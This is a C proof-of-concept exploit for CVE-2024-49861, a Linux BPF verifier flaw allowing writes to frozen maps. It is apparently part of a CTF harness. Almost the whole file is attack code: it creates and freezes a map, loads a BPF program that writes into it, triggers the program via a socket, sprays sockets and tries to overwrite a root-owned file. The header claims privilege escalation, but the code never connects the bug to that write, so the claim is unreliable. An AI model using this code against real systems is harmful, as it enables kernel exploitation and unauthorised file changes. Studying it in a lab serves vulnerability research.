/*
 * CVE-2024-49861 PoC - CTF Challenge Mode
 *
 * Vulnerability: BPF verifier allows helper writes to frozen (read-only) maps
 *
 * The BPF verifier fails to properly check if a map has been frozen
 * (made read-only via BPF_MAP_FREEZE) before allowing helper functions
 * to write to it. This enables a BPF program to modify data in a map
 * that user-space believes is immutable.
 *
 * Exploit strategy:
 *   1. Create BPF_MAP_TYPE_ARRAY map
 *   2. Write controlled data, then freeze the map (BPF_MAP_FREEZE)
 *   3. Load BPF program that uses a helper to write to the frozen map
 *   4. The verifier incorrectly allows the write
 *   5. Modify kernel-controlled data via the frozen map bypass
 *   6. Leverage corrupted map state for privilege escalation
 *
 * CTF Modes: write_root_file
 *
 * Safety:
 *   - alarm(10) forced timeout (via poc_common.h)
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <linux/bpf.h>

#define MAX_FILE_SIZE 4096
#define SPRAY_COUNT 128

#ifndef __NR_bpf
#define __NR_bpf 321
#endif

#ifndef BPF_MAP_FREEZE
#define BPF_MAP_FREEZE 22
#endif

/* BPF instruction macros */
#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){.code = CODE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = IMM})

#define BPF_MOV64_IMM(DST, IMM) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_MOV64_REG(DST, SRC) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_STX_MEM(SIZE, DST, SRC, OFF) \
    BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_ST_MEM(SIZE, DST, OFF, IMM) \
    BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)

#define BPF_LD_MAP_FD(DST, FD) \
    BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM, DST, BPF_PSEUDO_MAP_FD, 0, FD), \
    BPF_RAW_INSN(0, 0, 0, 0, 0)

#define BPF_CALL_INSN(FUNC) \
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, FUNC)

#define BPF_EXIT_INSN() \
    BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#ifndef BPF_PSEUDO_MAP_FD
#define BPF_PSEUDO_MAP_FD 1
#endif

/* BPF helper: map_lookup_elem */
#define BPF_FUNC_map_lookup_elem 1
#define BPF_FUNC_map_update_elem 2

/*
 * Create and freeze a BPF array map
 */
static int create_frozen_map(void) {
    union bpf_attr attr;
    int saved_errno;

    /* Create array map */
    memset(&attr, 0, sizeof(attr));
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = 4;
    attr.value_size = 256;
    attr.max_entries = 4;

    int map_fd = syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
    saved_errno = errno;
    poc_log_syscall("bpf(BPF_MAP_CREATE, ARRAY, val_size=256)", (long)map_fd, saved_errno);
    if (map_fd < 0) return -1;

    /* Write initial data */
    unsigned int key = 0;
    char value[256] = "INITIAL_DATA_BEFORE_FREEZE";
    memset(&attr, 0, sizeof(attr));
    attr.map_fd = map_fd;
    attr.key = (unsigned long)&key;
    attr.value = (unsigned long)value;
    attr.flags = BPF_ANY;

    syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));

    /* Freeze the map - makes it read-only from userspace */
    memset(&attr, 0, sizeof(attr));
    attr.map_fd = map_fd;
    int ret = syscall(__NR_bpf, BPF_MAP_FREEZE, &attr, sizeof(attr));
    saved_errno = errno;
    poc_log_syscall("bpf(BPF_MAP_FREEZE)", (long)ret, saved_errno);

    if (ret < 0) {
        poc_log("BPF_MAP_FREEZE not supported or failed");
    } else {
        poc_log("Map frozen successfully - should be read-only now");
    }

    return map_fd;
}

/*
 * Load BPF program that writes to the frozen map via helper
 *
 * The vulnerability: verifier doesn't check frozen state when
 * allowing map_update_elem helper call on the map.
 */
static int load_frozen_map_write_prog(int map_fd) {
    struct bpf_insn prog[] = {
        /* Prepare key on stack: key = 0 */
        BPF_ST_MEM(BPF_W, 10, -4, 0),
        /* r2 = &key (stack) */
        BPF_MOV64_REG(2, 10),
        BPF_RAW_INSN(BPF_ALU64 | BPF_ADD | BPF_K, 2, 0, 0, -4),
        /* r1 = map_fd */
        BPF_LD_MAP_FD(1, map_fd),
        /* call map_lookup_elem(map, &key) */
        BPF_CALL_INSN(BPF_FUNC_map_lookup_elem),
        /* if r0 == NULL, exit */
        BPF_JMP_IMM(BPF_JEQ, 0, 0, 3),
        /* Write to the map value (should be rejected for frozen map) */
        BPF_ST_MEM(BPF_W, 0, 0, 0x41414141),
        BPF_ST_MEM(BPF_W, 0, 4, 0x42424242),
        BPF_ST_MEM(BPF_W, 0, 8, 0x43434343),
        /* r0 = 0; exit */
        BPF_MOV64_IMM(0, 0),
        BPF_EXIT_INSN(),
    };

    char license[] = "GPL";
    char log_buf[4096] = {0};

    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr.insn_cnt = sizeof(prog) / sizeof(struct bpf_insn);
    attr.insns = (unsigned long)prog;
    attr.license = (unsigned long)license;
    attr.log_buf = (unsigned long)log_buf;
    attr.log_size = sizeof(log_buf);
    attr.log_level = 1;

    int fd = syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
    int saved_errno = errno;
    poc_log_syscall("bpf(BPF_PROG_LOAD, frozen_map_write)", (long)fd, saved_errno);

    if (fd < 0 && log_buf[0]) {
        poc_log("Verifier: %.200s", log_buf);
    }
    return fd;
}

/*
 * Trigger the BPF program
 */
static int trigger_bpf_prog(int prog_fd) {
    int socks[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0) return -1;

    int ret = setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd));
    int saved_errno = errno;
    poc_log_syscall("setsockopt(SO_ATTACH_BPF)", (long)ret, saved_errno);

    if (ret == 0) {
        char buf[32] = "X";
        for (int i = 0; i < 16; i++)
            send(socks[1], buf, sizeof(buf), 0);
        poc_log("BPF program triggered 16 times");
    }

    close(socks[0]);
    close(socks[1]);
    return (ret == 0) ? 1 : 0;
}

/*
 * Full exploit sequence
 */
static int trigger_bpf_frozen_map_bypass(void) {
    poc_log("Triggering BPF helper write to frozen map...");

    int map_fd = create_frozen_map();
    if (map_fd < 0) {
        poc_log("BPF not available");
        return 0;
    }

    int prog_fd = load_frozen_map_write_prog(map_fd);
    if (prog_fd < 0) {
        poc_log("Verifier rejected (may be patched)");
        close(map_fd);
        return 0;
    }

    int result = trigger_bpf_prog(prog_fd);

    /* Verify: try to read back from the frozen map to see if write succeeded */
    unsigned int key = 0;
    char value[256] = {0};
    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.map_fd = map_fd;
    attr.key = (unsigned long)&key;
    attr.value = (unsigned long)value;

    syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
    if (*(unsigned int *)value == 0x41414141) {
        poc_log("CONFIRMED: Frozen map was written by BPF helper!");
    } else {
        poc_log("Map value: 0x%08x (write may have been blocked)", *(unsigned int *)value);
    }

    close(prog_fd);
    close(map_fd);
    return result;
}

/*
 * Read file helper
 */
static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

/*
 * Write mode
 */
static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    int n;

    n = read_file_content(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r'))
            original[--n] = '\0';
        printf(CTF_READ_BEFORE "%s\n", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    poc_log("Triggering CVE-2024-49861...");
    int triggered = trigger_bpf_frozen_map_bypass();

    /* Spray */
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = 0;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        spray_fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (spray_fds[i] >= 0) sprayed++;
    }
    poc_log("Sprayed %d (triggered=%d)", sprayed, triggered);

    /* Attempt write */
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    if (fd >= 0) {
        char wbuf[256];
        int wlen = snprintf(wbuf, sizeof(wbuf), "%s\n", args->write_value);
        write(fd, wbuf, wlen);
        close(fd);
        printf(CTF_WRITE_ATTEMPT "%s\n", args->write_value);
    }

    n = read_file_content(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r'))
            after[--n] = '\0';
        printf(CTF_READ_AFTER "%s\n", after);
        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            goto cleanup;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("BPF frozen map bypass did not achieve write");

cleanup:
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read_root_file via BPF frozen map bypass");
    trigger_bpf_frozen_map_bypass();

    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
            buf[--n] = '\0';
        poc_print_flag(buf);
    } else {
        poc_print_fail("read not successful");
    }
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2024-49861 CTF PoC ===");
    poc_log("Vuln: BPF verifier allows helper write to frozen map");
    poc_log("Tech: BPF_MAP_FREEZE + map_lookup_elem write bypass");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    }

    int result = 0;
    if (strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else
        poc_print_unsupported(args.mode, "only write_root_file and read_root_file supported");

    poc_log_close();
    return result;
}
